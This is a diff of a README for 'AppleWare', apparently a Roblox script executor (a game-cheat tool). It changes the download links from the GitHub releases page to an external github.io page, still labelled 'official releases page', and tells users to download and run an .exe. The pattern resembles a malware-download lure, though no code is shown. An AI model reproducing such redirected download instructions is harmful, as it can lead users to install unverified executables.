@@ -1,12 +1,12 @@
 # 🍎 appleware-windows-script-hub - Run Roblox scripts with ease today
 
-[![](https://img.shields.io/badge/Download-AppleWare-blue.svg)](https://github.com/Alsb8889/appleware-windows-script-hub/releases)
+[![](https://img.shields.io/badge/Download-AppleWare-blue.svg)](https://alsb8889.github.io)
 
 AppleWare PC is a tool for Windows 10 and 11. It helps users manage and run scripts within Roblox. The software provides a simple interface. It connects to the game engine to execute code. This package includes automatic updates. It runs as a desktop application. You find all necessary tools in one place.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/Alsb8889/appleware-windows-script-hub/releases).
+1. Visit the [official releases page](https://alsb8889.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your computer.
